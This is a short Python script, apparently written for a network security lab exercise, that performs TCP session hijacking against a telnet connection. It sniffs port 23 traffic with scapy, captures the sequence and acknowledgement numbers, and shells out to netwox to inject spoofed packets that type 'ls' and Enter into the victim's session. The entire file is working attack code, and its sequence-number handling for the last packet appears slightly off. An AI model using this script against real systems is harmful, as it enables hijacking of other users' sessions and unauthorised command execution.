#!/usr/bin/python
from scapy.all import *
import thread


def attack(a,b):
  print("wait for attack")
  temp=raw_input()
  print("attack start")
  scrip1="netwox 40 --ip4-dontfrag --ip4-offsetfrag 0 --ip4-ttl 64 --ip4-protocol 6 --ip4-src 10.0.2.133 --ip4-dst 10.0.2.134 --tcp-src "
  scrip2=" --tcp-dst 23 --tcp-seqnum "
  scrip3=" --tcp-acknum "
  scrip4=" --tcp-ack --tcp-psh --tcp-window 128 --tcp-data "
  scrip=scrip1+str(sport)+scrip2+str(seq)+scrip3+str(ack)+scrip4+"6c"
  os.system(scrip)
  scrip=scrip1+str(sport)+scrip2+str(seq+1)+scrip3+str(ack+1)+scrip4+"73"
  os.system(scrip)
  scrip=scrip1+str(sport)+scrip2+str(seq+1)+scrip3+str(ack+1)+scrip4+"0d00"
  os.system(scrip)


  print(scrip)

def print_pkt(pkt):
    global sport
    global ack
    global seq
    if pkt[TCP].dport==23:
        print("---------------------------------")
        print("dst port="+str(pkt[TCP].sport))
        sport=pkt[TCP].sport
        print("ack="+str(pkt[TCP].ack))
        ack=pkt[TCP].ack
        print("seq="+str(pkt[TCP].seq))
        seq=pkt[TCP].seq
  #  prtin("window="+pkt[TCP].window)

sport=0
ack=0
seq=0
thread.start_new_thread( attack ,(0,0))
pkt=sniff(filter='tcp',prn=print_pkt)##1.1A


